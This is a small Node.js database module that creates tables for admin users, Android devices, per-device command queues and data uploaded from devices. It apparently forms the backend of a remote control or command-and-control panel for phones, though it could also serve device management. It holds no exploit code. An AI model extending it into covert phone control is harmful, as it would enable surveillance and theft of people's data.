// lib/db.js
const { sql } = require('@vercel/postgres');

let initialized = false;

async function init() {
  if (initialized) return;
  await sql`
    CREATE TABLE IF NOT EXISTS admin_users (
      id SERIAL PRIMARY KEY,
      username TEXT UNIQUE NOT NULL,
      password_hash TEXT NOT NULL,
      created_at TIMESTAMP DEFAULT NOW()
    )`;
  await sql`
    CREATE TABLE IF NOT EXISTS devices (
      device_id TEXT PRIMARY KEY,
      brand TEXT, model TEXT, android TEXT,
      sdk INTEGER, battery INTEGER, last_seen TIMESTAMP
    )`;
  await sql`
    CREATE TABLE IF NOT EXISTS commands (
      id SERIAL PRIMARY KEY,
      device_id TEXT, action TEXT, arg TEXT,
      created_at TIMESTAMP DEFAULT NOW(),
      delivered INTEGER DEFAULT 0
    )`;
  await sql`
    CREATE TABLE IF NOT EXISTS uploads (
      id SERIAL PRIMARY KEY,
      device_id TEXT, type TEXT, data TEXT,
      created_at TIMESTAMP DEFAULT NOW()
    )`;
  initialized = true;
}

module.exports = { sql, init };
